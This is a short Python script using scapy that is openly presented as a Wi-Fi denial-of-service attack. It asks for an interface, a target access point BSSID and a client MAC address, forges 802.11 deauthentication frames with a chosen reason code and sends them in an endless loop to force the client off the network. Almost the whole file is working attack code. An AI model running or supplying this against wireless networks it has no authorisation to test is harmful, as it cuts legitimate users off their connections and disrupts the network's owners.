#!/usr/bin/env python3

# dos attack using deauth packets
# needs target mac and bssid

# reason can be different--> line 31
# reason=0 no reason
# reason=1 unspecified reason
# reason=2 client is associated but not authenticated
# reason=3 access point goes offline
# reason=4 client has reached session timeout
# reason=5 access point has to heavy load
# reason=6 client tried to send data without being authenticated
# reason=7 client tried to send data without being associated
# reason=8 client got transferred to another AP
# reason=9 client tried to associate without being authenticated

import time
from scapy.all import *

iface = str(input('\n Enter interface: '))
# the attack can be speed up or slowed down
timeout = 1

bssid = str(input(' Enter target BSSID: '))
dest = str(input(' Enter target Mac: '))

# construction of the deauth packet
# reason can be changed
pkt = RadioTap() / Dot11(subtype=0xc, addr1=dest,
                         addr2=bssid, addr3=bssid) / Dot11Deauth(reason=3)

print ('Press ctr-c to stop the attack.')

while True:
    print ("Sending deauth to " + dest)
    sendp(pkt, iface=iface)
    time.sleep(timeout)
